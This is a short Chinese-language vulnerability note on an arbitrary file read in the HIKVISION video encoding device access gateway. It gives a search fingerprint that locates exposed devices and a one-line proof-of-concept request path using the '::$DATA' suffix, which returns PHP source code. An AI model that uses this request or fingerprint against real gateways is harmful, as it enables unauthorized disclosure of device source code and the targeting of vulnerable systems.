# HIKVISION 视频编码设备接入网关 $DATA 任意文件读取

## 漏洞描述

HIKVISION 视频编码设备接入网关存在配置错误特性，特殊后缀请求php文件可读取源码

## 漏洞影响

<a-checkbox checked>HIKVISION 视频编码设备接入网关</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="视频编码设备接入网关"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1628164956874-f53d9c48-6820-4c43-a3e5-aea8b6415ae8.png)

验证POC

```plain
/data/login.php::$DATA
```

![img](../../../.vuepress/public/img/1628165037205-928b64e5-2476-4511-afee-c562b17a031d.png)